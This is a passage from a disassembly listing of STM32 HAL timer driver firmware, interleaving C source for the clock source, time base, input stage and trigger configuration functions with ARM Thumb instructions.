      TIM_ETR_SetConfig(htim->Instance,
 80052b2:	f000 f971 	bl	8005598 <TIM_ETR_SetConfig>

      /* Select the External clock mode1 and the ETRF trigger */
      tmpsmcr = htim->Instance->SMCR;
 80052b6:	687b      	ldr	r3, [r7, #4]
 80052b8:	681b      	ldr	r3, [r3, #0]
 80052ba:	689b      	ldr	r3, [r3, #8]
 80052bc:	60bb      	str	r3, [r7, #8]
      tmpsmcr |= (TIM_SLAVEMODE_EXTERNAL1 | TIM_CLOCKSOURCE_ETRMODE1);
 80052be:	68bb      	ldr	r3, [r7, #8]
 80052c0:	f043 0377 	orr.w	r3, r3, #119	; 0x77
 80052c4:	60bb      	str	r3, [r7, #8]
      /* Write to TIMx SMCR */
      htim->Instance->SMCR = tmpsmcr;
 80052c6:	687b      	ldr	r3, [r7, #4]
 80052c8:	681b      	ldr	r3, [r3, #0]
 80052ca:	68ba      	ldr	r2, [r7, #8]
 80052cc:	609a      	str	r2, [r3, #8]
      break;
 80052ce:	e04f      	b.n	8005370 <HAL_TIM_ConfigClockSource+0x178>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 80052d0:	687b      	ldr	r3, [r7, #4]
 80052d2:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 80052d4:	683b      	ldr	r3, [r7, #0]
 80052d6:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 80052d8:	683b      	ldr	r3, [r7, #0]
 80052da:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 80052dc:	683b      	ldr	r3, [r7, #0]
 80052de:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 80052e0:	f000 f95a 	bl	8005598 <TIM_ETR_SetConfig>
      /* Enable the External clock mode2 */
      htim->Instance->SMCR |= TIM_SMCR_ECE;
 80052e4:	687b      	ldr	r3, [r7, #4]
 80052e6:	681b      	ldr	r3, [r3, #0]
 80052e8:	689a      	ldr	r2, [r3, #8]
 80052ea:	687b      	ldr	r3, [r7, #4]
 80052ec:	681b      	ldr	r3, [r3, #0]
 80052ee:	f442 4280 	orr.w	r2, r2, #16384	; 0x4000
 80052f2:	609a      	str	r2, [r3, #8]
      break;
 80052f4:	e03c      	b.n	8005370 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 80052f6:	687b      	ldr	r3, [r7, #4]
 80052f8:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 80052fa:	683b      	ldr	r3, [r7, #0]
 80052fc:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 80052fe:	683b      	ldr	r3, [r7, #0]
 8005300:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 8005302:	461a      	mov	r2, r3
 8005304:	f000 f8ce 	bl	80054a4 <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1);
 8005308:	687b      	ldr	r3, [r7, #4]
 800530a:	681b      	ldr	r3, [r3, #0]
 800530c:	2150      	movs	r1, #80	; 0x50
 800530e:	4618      	mov	r0, r3
 8005310:	f000 f927 	bl	8005562 <TIM_ITRx_SetConfig>
      break;
 8005314:	e02c      	b.n	8005370 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI2 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI2_ConfigInputStage(htim->Instance,
 8005316:	687b      	ldr	r3, [r7, #4]
 8005318:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 800531a:	683b      	ldr	r3, [r7, #0]
 800531c:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 800531e:	683b      	ldr	r3, [r7, #0]
 8005320:	68db      	ldr	r3, [r3, #12]
      TIM_TI2_ConfigInputStage(htim->Instance,
 8005322:	461a      	mov	r2, r3
 8005324:	f000 f8ed 	bl	8005502 <TIM_TI2_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI2);
 8005328:	687b      	ldr	r3, [r7, #4]
 800532a:	681b      	ldr	r3, [r3, #0]
 800532c:	2160      	movs	r1, #96	; 0x60
 800532e:	4618      	mov	r0, r3
 8005330:	f000 f917 	bl	8005562 <TIM_ITRx_SetConfig>
      break;
 8005334:	e01c      	b.n	8005370 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 8005336:	687b      	ldr	r3, [r7, #4]
 8005338:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 800533a:	683b      	ldr	r3, [r7, #0]
 800533c:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 800533e:	683b      	ldr	r3, [r7, #0]
 8005340:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 8005342:	461a      	mov	r2, r3
 8005344:	f000 f8ae 	bl	80054a4 <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1ED);
 8005348:	687b      	ldr	r3, [r7, #4]
 800534a:	681b      	ldr	r3, [r3, #0]
 800534c:	2140      	movs	r1, #64	; 0x40
 800534e:	4618      	mov	r0, r3
 8005350:	f000 f907 	bl	8005562 <TIM_ITRx_SetConfig>
      break;
 8005354:	e00c      	b.n	8005370 <HAL_TIM_ConfigClockSource+0x178>
    case TIM_CLOCKSOURCE_ITR3:
    {
      /* Check whether or not the timer instance supports internal trigger input */
      assert_param(IS_TIM_CLOCKSOURCE_ITRX_INSTANCE(htim->Instance));

      TIM_ITRx_SetConfig(htim->Instance, sClockSourceConfig->ClockSource);
 8005356:	687b      	ldr	r3, [r7, #4]
 8005358:	681a      	ldr	r2, [r3, #0]
 800535a:	683b      	ldr	r3, [r7, #0]
 800535c:	681b      	ldr	r3, [r3, #0]
 800535e:	4619      	mov	r1, r3
 8005360:	4610      	mov	r0, r2
 8005362:	f000 f8fe 	bl	8005562 <TIM_ITRx_SetConfig>
      break;
 8005366:	e003      	b.n	8005370 <HAL_TIM_ConfigClockSource+0x178>
    }

    default:
      status = HAL_ERROR;
 8005368:	2301      	movs	r3, #1
 800536a:	73fb      	strb	r3, [r7, #15]
      break;
 800536c:	e000      	b.n	8005370 <HAL_TIM_ConfigClockSource+0x178>
      break;
 800536e:	bf00      	nop
  }
  htim->State = HAL_TIM_STATE_READY;
 8005370:	687b      	ldr	r3, [r7, #4]
 8005372:	2201      	movs	r2, #1
 8005374:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 8005378:	687b      	ldr	r3, [r7, #4]
 800537a:	2200      	movs	r2, #0
 800537c:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return status;
 8005380:	7bfb      	ldrb	r3, [r7, #15]
}
 8005382:	4618      	mov	r0, r3
 8005384:	3710      	adds	r7, #16
 8005386:	46bd      	mov	sp, r7
 8005388:	bd80      	pop	{r7, pc}

0800538a <HAL_TIM_OC_DelayElapsedCallback>:
  * @brief  Output Compare callback in non-blocking mode
  * @param  htim TIM OC handle
  * @retval None
  */
__weak void HAL_TIM_OC_DelayElapsedCallback(TIM_HandleTypeDef *htim)
{
 800538a:	b480      	push	{r7}
 800538c:	b083      	sub	sp, #12
 800538e:	af00      	add	r7, sp, #0
 8005390:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_OC_DelayElapsedCallback could be implemented in the user file
   */
}
 8005392:	bf00      	nop
 8005394:	370c      	adds	r7, #12
 8005396:	46bd      	mov	sp, r7
 8005398:	f85d 7b04 	ldr.w	r7, [sp], #4
 800539c:	4770      	bx	lr

0800539e <HAL_TIM_IC_CaptureCallback>:
  * @brief  Input Capture callback in non-blocking mode
  * @param  htim TIM IC handle
  * @retval None
  */
__weak void HAL_TIM_IC_CaptureCallback(TIM_HandleTypeDef *htim)
{
 800539e:	b480      	push	{r7}
 80053a0:	b083      	sub	sp, #12
 80053a2:	af00      	add	r7, sp, #0
 80053a4:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_IC_CaptureCallback could be implemented in the user file
   */
}
 80053a6:	bf00      	nop
 80053a8:	370c      	adds	r7, #12
 80053aa:	46bd      	mov	sp, r7
 80053ac:	f85d 7b04 	ldr.w	r7, [sp], #4
 80053b0:	4770      	bx	lr

080053b2 <HAL_TIM_PWM_PulseFinishedCallback>:
  * @brief  PWM Pulse finished callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_PWM_PulseFinishedCallback(TIM_HandleTypeDef *htim)
{
 80053b2:	b480      	push	{r7}
 80053b4:	b083      	sub	sp, #12
 80053b6:	af00      	add	r7, sp, #0
 80053b8:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_PWM_PulseFinishedCallback could be implemented in the user file
   */
}
 80053ba:	bf00      	nop
 80053bc:	370c      	adds	r7, #12
 80053be:	46bd      	mov	sp, r7
 80053c0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80053c4:	4770      	bx	lr

080053c6 <HAL_TIM_TriggerCallback>:
  * @brief  Hall Trigger detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_TriggerCallback(TIM_HandleTypeDef *htim)
{
 80053c6:	b480      	push	{r7}
 80053c8:	b083      	sub	sp, #12
 80053ca:	af00      	add	r7, sp, #0
 80053cc:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_TriggerCallback could be implemented in the user file
   */
}
 80053ce:	bf00      	nop
 80053d0:	370c      	adds	r7, #12
 80053d2:	46bd      	mov	sp, r7
 80053d4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80053d8:	4770      	bx	lr
	...

080053dc <TIM_Base_SetConfig>:
  * @param  TIMx TIM peripheral
  * @param  Structure TIM Base configuration structure
  * @retval None
  */
void TIM_Base_SetConfig(TIM_TypeDef *TIMx, const TIM_Base_InitTypeDef *Structure)
{
 80053dc:	b480      	push	{r7}
 80053de:	b085      	sub	sp, #20
 80053e0:	af00      	add	r7, sp, #0
 80053e2:	6078      	str	r0, [r7, #4]
 80053e4:	6039      	str	r1, [r7, #0]
  uint32_t tmpcr1;
  tmpcr1 = TIMx->CR1;
 80053e6:	687b      	ldr	r3, [r7, #4]
 80053e8:	681b      	ldr	r3, [r3, #0]
 80053ea:	60fb      	str	r3, [r7, #12]

  /* Set TIM Time Base Unit parameters ---------------------------------------*/
  if (IS_TIM_COUNTER_MODE_SELECT_INSTANCE(TIMx))
 80053ec:	687b      	ldr	r3, [r7, #4]
 80053ee:	4a2a      	ldr	r2, [pc, #168]	; (8005498 <TIM_Base_SetConfig+0xbc>)
 80053f0:	4293      	cmp	r3, r2
 80053f2:	d003      	beq.n	80053fc <TIM_Base_SetConfig+0x20>
 80053f4:	687b      	ldr	r3, [r7, #4]
 80053f6:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 80053fa:	d108      	bne.n	800540e <TIM_Base_SetConfig+0x32>
  {
    /* Select the Counter Mode */
    tmpcr1 &= ~(TIM_CR1_DIR | TIM_CR1_CMS);
 80053fc:	68fb      	ldr	r3, [r7, #12]
 80053fe:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005402:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= Structure->CounterMode;
 8005404:	683b      	ldr	r3, [r7, #0]
 8005406:	685b      	ldr	r3, [r3, #4]
 8005408:	68fa      	ldr	r2, [r7, #12]
 800540a:	4313      	orrs	r3, r2
 800540c:	60fb      	str	r3, [r7, #12]
  }

  if (IS_TIM_CLOCK_DIVISION_INSTANCE(TIMx))
 800540e:	687b      	ldr	r3, [r7, #4]
 8005410:	4a21      	ldr	r2, [pc, #132]	; (8005498 <TIM_Base_SetConfig+0xbc>)
 8005412:	4293      	cmp	r3, r2
 8005414:	d00b      	beq.n	800542e <TIM_Base_SetConfig+0x52>
 8005416:	687b      	ldr	r3, [r7, #4]
 8005418:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 800541c:	d007      	beq.n	800542e <TIM_Base_SetConfig+0x52>
 800541e:	687b      	ldr	r3, [r7, #4]
 8005420:	4a1e      	ldr	r2, [pc, #120]	; (800549c <TIM_Base_SetConfig+0xc0>)
 8005422:	4293      	cmp	r3, r2
 8005424:	d003      	beq.n	800542e <TIM_Base_SetConfig+0x52>
 8005426:	687b      	ldr	r3, [r7, #4]
 8005428:	4a1d      	ldr	r2, [pc, #116]	; (80054a0 <TIM_Base_SetConfig+0xc4>)
 800542a:	4293      	cmp	r3, r2
 800542c:	d108      	bne.n	8005440 <TIM_Base_SetConfig+0x64>
  {
    /* Set the clock division */
    tmpcr1 &= ~TIM_CR1_CKD;
 800542e:	68fb      	ldr	r3, [r7, #12]
 8005430:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 8005434:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= (uint32_t)Structure->ClockDivision;
 8005436:	683b      	ldr	r3, [r7, #0]
 8005438:	68db      	ldr	r3, [r3, #12]
 800543a:	68fa      	ldr	r2, [r7, #12]
 800543c:	4313      	orrs	r3, r2
 800543e:	60fb      	str	r3, [r7, #12]
  }

  /* Set the auto-reload preload */
  MODIFY_REG(tmpcr1, TIM_CR1_ARPE, Structure->AutoReloadPreload);
 8005440:	68fb      	ldr	r3, [r7, #12]
 8005442:	f023 0280 	bic.w	r2, r3, #128	; 0x80
 8005446:	683b      	ldr	r3, [r7, #0]
 8005448:	695b      	ldr	r3, [r3, #20]
 800544a:	4313      	orrs	r3, r2
 800544c:	60fb      	str	r3, [r7, #12]

  TIMx->CR1 = tmpcr1;
 800544e:	687b      	ldr	r3, [r7, #4]
 8005450:	68fa      	ldr	r2, [r7, #12]
 8005452:	601a      	str	r2, [r3, #0]

  /* Set the Autoreload value */
  TIMx->ARR = (uint32_t)Structure->Period ;
 8005454:	683b      	ldr	r3, [r7, #0]
 8005456:	689a      	ldr	r2, [r3, #8]
 8005458:	687b      	ldr	r3, [r7, #4]
 800545a:	62da      	str	r2, [r3, #44]	; 0x2c

  /* Set the Prescaler value */
  TIMx->PSC = Structure->Prescaler;
 800545c:	683b      	ldr	r3, [r7, #0]
 800545e:	681a      	ldr	r2, [r3, #0]
 8005460:	687b      	ldr	r3, [r7, #4]
 8005462:	629a      	str	r2, [r3, #40]	; 0x28

  if (IS_TIM_REPETITION_COUNTER_INSTANCE(TIMx))
 8005464:	687b      	ldr	r3, [r7, #4]
 8005466:	4a0c      	ldr	r2, [pc, #48]	; (8005498 <TIM_Base_SetConfig+0xbc>)
 8005468:	4293      	cmp	r3, r2
 800546a:	d007      	beq.n	800547c <TIM_Base_SetConfig+0xa0>
 800546c:	687b      	ldr	r3, [r7, #4]
 800546e:	4a0b      	ldr	r2, [pc, #44]	; (800549c <TIM_Base_SetConfig+0xc0>)
 8005470:	4293      	cmp	r3, r2
 8005472:	d003      	beq.n	800547c <TIM_Base_SetConfig+0xa0>
 8005474:	687b      	ldr	r3, [r7, #4]
 8005476:	4a0a      	ldr	r2, [pc, #40]	; (80054a0 <TIM_Base_SetConfig+0xc4>)
 8005478:	4293      	cmp	r3, r2
 800547a:	d103      	bne.n	8005484 <TIM_Base_SetConfig+0xa8>
  {
    /* Set the Repetition Counter value */
    TIMx->RCR = Structure->RepetitionCounter;
 800547c:	683b      	ldr	r3, [r7, #0]
 800547e:	691a      	ldr	r2, [r3, #16]
 8005480:	687b      	ldr	r3, [r7, #4]
 8005482:	631a      	str	r2, [r3, #48]	; 0x30
  }

  /* Generate an update event to reload the Prescaler
     and the repetition counter (only for advanced timer) value immediately */
  TIMx->EGR = TIM_EGR_UG;
 8005484:	687b      	ldr	r3, [r7, #4]
 8005486:	2201      	movs	r2, #1
 8005488:	615a      	str	r2, [r3, #20]
}
 800548a:	bf00      	nop
 800548c:	3714      	adds	r7, #20
 800548e:	46bd      	mov	sp, r7
 8005490:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005494:	4770      	bx	lr
 8005496:	bf00      	nop
 8005498:	40012c00 	.word	0x40012c00
 800549c:	40014000 	.word	0x40014000
 80054a0:	40014400 	.word	0x40014400

080054a4 <TIM_TI1_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI1_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 80054a4:	b480      	push	{r7}
 80054a6:	b087      	sub	sp, #28
 80054a8:	af00      	add	r7, sp, #0
 80054aa:	60f8      	str	r0, [r7, #12]
 80054ac:	60b9      	str	r1, [r7, #8]
 80054ae:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 1: Reset the CC1E Bit */
  tmpccer = TIMx->CCER;
 80054b0:	68fb      	ldr	r3, [r7, #12]
 80054b2:	6a1b      	ldr	r3, [r3, #32]
 80054b4:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC1E;
 80054b6:	68fb      	ldr	r3, [r7, #12]
 80054b8:	6a1b      	ldr	r3, [r3, #32]
 80054ba:	f023 0201 	bic.w	r2, r3, #1
 80054be:	68fb      	ldr	r3, [r7, #12]
 80054c0:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 80054c2:	68fb      	ldr	r3, [r7, #12]
 80054c4:	699b      	ldr	r3, [r3, #24]
 80054c6:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC1F;
 80054c8:	693b      	ldr	r3, [r7, #16]
 80054ca:	f023 03f0 	bic.w	r3, r3, #240	; 0xf0
 80054ce:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 4U);
 80054d0:	687b      	ldr	r3, [r7, #4]
 80054d2:	011b      	lsls	r3, r3, #4
 80054d4:	693a      	ldr	r2, [r7, #16]
 80054d6:	4313      	orrs	r3, r2
 80054d8:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC1E Bit */
  tmpccer &= ~(TIM_CCER_CC1P | TIM_CCER_CC1NP);
 80054da:	697b      	ldr	r3, [r7, #20]
 80054dc:	f023 030a 	bic.w	r3, r3, #10
 80054e0:	617b      	str	r3, [r7, #20]
  tmpccer |= TIM_ICPolarity;
 80054e2:	697a      	ldr	r2, [r7, #20]
 80054e4:	68bb      	ldr	r3, [r7, #8]
 80054e6:	4313      	orrs	r3, r2
 80054e8:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1;
 80054ea:	68fb      	ldr	r3, [r7, #12]
 80054ec:	693a      	ldr	r2, [r7, #16]
 80054ee:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 80054f0:	68fb      	ldr	r3, [r7, #12]
 80054f2:	697a      	ldr	r2, [r7, #20]
 80054f4:	621a      	str	r2, [r3, #32]
}
 80054f6:	bf00      	nop
 80054f8:	371c      	adds	r7, #28
 80054fa:	46bd      	mov	sp, r7
 80054fc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005500:	4770      	bx	lr

08005502 <TIM_TI2_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI2_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 8005502:	b480      	push	{r7}
 8005504:	b087      	sub	sp, #28
 8005506:	af00      	add	r7, sp, #0
 8005508:	60f8      	str	r0, [r7, #12]
 800550a:	60b9      	str	r1, [r7, #8]
 800550c:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 2: Reset the CC2E Bit */
  tmpccer = TIMx->CCER;
 800550e:	68fb      	ldr	r3, [r7, #12]
 8005510:	6a1b      	ldr	r3, [r3, #32]
 8005512:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC2E;
 8005514:	68fb      	ldr	r3, [r7, #12]
 8005516:	6a1b      	ldr	r3, [r3, #32]
 8005518:	f023 0210 	bic.w	r2, r3, #16
 800551c:	68fb      	ldr	r3, [r7, #12]
 800551e:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 8005520:	68fb      	ldr	r3, [r7, #12]
 8005522:	699b      	ldr	r3, [r3, #24]
 8005524:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC2F;
 8005526:	693b      	ldr	r3, [r7, #16]
 8005528:	f423 4370 	bic.w	r3, r3, #61440	; 0xf000
 800552c:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 12U);
 800552e:	687b      	ldr	r3, [r7, #4]
 8005530:	031b      	lsls	r3, r3, #12
 8005532:	693a      	ldr	r2, [r7, #16]
 8005534:	4313      	orrs	r3, r2
 8005536:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC2E Bit */
  tmpccer &= ~(TIM_CCER_CC2P | TIM_CCER_CC2NP);
 8005538:	697b      	ldr	r3, [r7, #20]
 800553a:	f023 03a0 	bic.w	r3, r3, #160	; 0xa0
 800553e:	617b      	str	r3, [r7, #20]
  tmpccer |= (TIM_ICPolarity << 4U);
 8005540:	68bb      	ldr	r3, [r7, #8]
 8005542:	011b      	lsls	r3, r3, #4
 8005544:	697a      	ldr	r2, [r7, #20]
 8005546:	4313      	orrs	r3, r2
 8005548:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1 ;
 800554a:	68fb      	ldr	r3, [r7, #12]
 800554c:	693a      	ldr	r2, [r7, #16]
 800554e:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 8005550:	68fb      	ldr	r3, [r7, #12]
 8005552:	697a      	ldr	r2, [r7, #20]
 8005554:	621a      	str	r2, [r3, #32]
}
 8005556:	bf00      	nop
 8005558:	371c      	adds	r7, #28
 800555a:	46bd      	mov	sp, r7
 800555c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005560:	4770      	bx	lr

08005562 <TIM_ITRx_SetConfig>:
  *            @arg TIM_TS_TI2FP2: Filtered Timer Input 2
  *            @arg TIM_TS_ETRF: External Trigger input
  * @retval None
  */
static void TIM_ITRx_SetConfig(TIM_TypeDef *TIMx, uint32_t InputTriggerSource)
{
 8005562:	b480      	push	{r7}
 8005564:	b085      	sub	sp, #20
 8005566:	af00      	add	r7, sp, #0
 8005568:	6078      	str	r0, [r7, #4]
 800556a:	6039      	str	r1, [r7, #0]
  uint32_t tmpsmcr;

  /* Get the TIMx SMCR register value */
  tmpsmcr = TIMx->SMCR;
 800556c:	687b      	ldr	r3, [r7, #4]
 800556e:	689b      	ldr	r3, [r3, #8]
 8005570:	60fb      	str	r3, [r7, #12]
  /* Reset the TS Bits */
  tmpsmcr &= ~TIM_SMCR_TS;
 8005572:	68fb      	ldr	r3, [r7, #12]
 8005574:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005578:	60fb      	str	r3, [r7, #12]
  /* Set the Input Trigger source and the slave mode*/
  tmpsmcr |= (InputTriggerSource | TIM_SLAVEMODE_EXTERNAL1);
 800557a:	683a      	ldr	r2, [r7, #0]
 800557c:	68fb      	ldr	r3, [r7, #12]
 800557e:	4313      	orrs	r3, r2
 8005580:	f043 0307 	orr.w	r3, r3, #7
 8005584:	60fb      	str	r3, [r7, #12]
  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 8005586:	687b      	ldr	r3, [r7, #4]
 8005588:	68fa      	ldr	r2, [r7, #12]
 800558a:	609a      	str	r2, [r3, #8]
}
 800558c:	bf00      	nop
 800558e:	3714      	adds	r7, #20
 8005590:	46bd      	mov	sp, r7
 8005592:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005596:	4770      	bx	lr

08005598 <TIM_ETR_SetConfig>:
  *          This parameter must be a value between 0x00 and 0x0F
  * @retval None
  */
void TIM_ETR_SetConfig(TIM_TypeDef *TIMx, uint32_t TIM_ExtTRGPrescaler,
                       uint32_t TIM_ExtTRGPolarity, uint32_t ExtTRGFilter)
{
 8005598:	b480      	push	{r7}
 800559a:	b087      	sub	sp, #28
 800559c:	af00      	add	r7, sp, #0
 800559e:	60f8      	str	r0, [r7, #12]
 80055a0:	60b9      	str	r1, [r7, #8]
 80055a2:	607a      	str	r2, [r7, #4]
 80055a4:	603b      	str	r3, [r7, #0]
  uint32_t tmpsmcr;

  tmpsmcr = TIMx->SMCR;
 80055a6:	68fb      	ldr	r3, [r7, #12]
 80055a8:	689b      	ldr	r3, [r3, #8]
 80055aa:	617b      	str	r3, [r7, #20]

  /* Reset the ETR Bits */
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 80055ac:	697b      	ldr	r3, [r7, #20]
 80055ae:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 80055b2:	617b      	str	r3, [r7, #20]

  /* Set the Prescaler, the Filter value and the Polarity */
  tmpsmcr |= (uint32_t)(TIM_ExtTRGPrescaler | (TIM_ExtTRGPolarity | (ExtTRGFilter << 8U)));
 80055b4:	683b      	ldr	r3, [r7, #0]
 80055b6:	021a      	lsls	r2, r3, #8
 80055b8:	687b      	ldr	r3, [r7, #4]
 80055ba:	431a      	orrs	r2, r3
 80055bc:	68bb      	ldr	r3, [r7, #8]
 80055be:	4313      	orrs	r3, r2
 80055c0:	697a      	ldr	r2, [r7, #20]
 80055c2:	4313      	orrs	r3, r2
 80055c4:	617b      	str	r3, [r7, #20]

  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 80055c6:	68fb      	ldr	r3, [r7, #12]
 80055c8:	697a      	ldr	r2, [r7, #20]
 80055ca:	609a      	str	r2, [r3, #8]
}
 80055cc:	bf00      	nop
 80055ce:	371c      	adds	r7, #28
 80055d0:	46bd      	mov	sp, r7
 80055d2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80055d6:	4770      	bx	lr

080055d8 <HAL_TIMEx_MasterConfigSynchronization>:
  *         mode.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIMEx_MasterConfigSynchronization(TIM_HandleTypeDef *htim,
                                                        const TIM_MasterConfigTypeDef *sMasterConfig)
{
 80055d8:	b480      	push	{r7}
 80055da:	b085      	sub	sp, #20
 80055dc:	af00      	add	r7, sp, #0
 80055de:	6078      	str	r0, [r7, #4]
 80055e0:	6039      	str	r1, [r7, #0]
  assert_param(IS_TIM_MASTER_INSTANCE(htim->Instance));
  assert_param(IS_TIM_TRGO_SOURCE(sMasterConfig->MasterOutputTrigger));
  assert_param(IS_TIM_MSM_STATE(sMasterConfig->MasterSlaveMode));

  /* Check input state */
  __HAL_LOCK(htim);
 80055e2:	687b      	ldr	r3, [r7, #4]
 80055e4:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 80055e8:	2b01      	cmp	r3, #1
 80055ea:	d101      	bne.n	80055f0 <HAL_TIMEx_MasterConfigSynchronization+0x18>
 80055ec:	2302      	movs	r3, #2
 80055ee:	e04f      	b.n	8005690 <HAL_TIMEx_MasterConfigSynchronization+0xb8>
 80055f0:	687b      	ldr	r3, [r7, #4]
 80055f2:	2201      	movs	r2, #1
 80055f4:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  /* Change the handler state */
  htim->State = HAL_TIM_STATE_BUSY;
 80055f8:	687b      	ldr	r3, [r7, #4]
 80055fa:	2202      	movs	r2, #2
 80055fc:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Get the TIMx CR2 register value */
  tmpcr2 = htim->Instance->CR2;
 8005600:	687b      	ldr	r3, [r7, #4]
 8005602:	681b      	ldr	r3, [r3, #0]
 8005604:	685b      	ldr	r3, [r3, #4]
 8005606:	60fb      	str	r3, [r7, #12]

  /* Get the TIMx SMCR register value */
  tmpsmcr = htim->Instance->SMCR;
 8005608:	687b      	ldr	r3, [r7, #4]
 800560a:	681b      	ldr	r3, [r3, #0]
 800560c:	689b      	ldr	r3, [r3, #8]
 800560e:	60bb      	str	r3, [r7, #8]

  /* If the timer supports ADC synchronization through TRGO2, set the master mode selection 2 */
  if (IS_TIM_TRGO2_INSTANCE(htim->Instance))
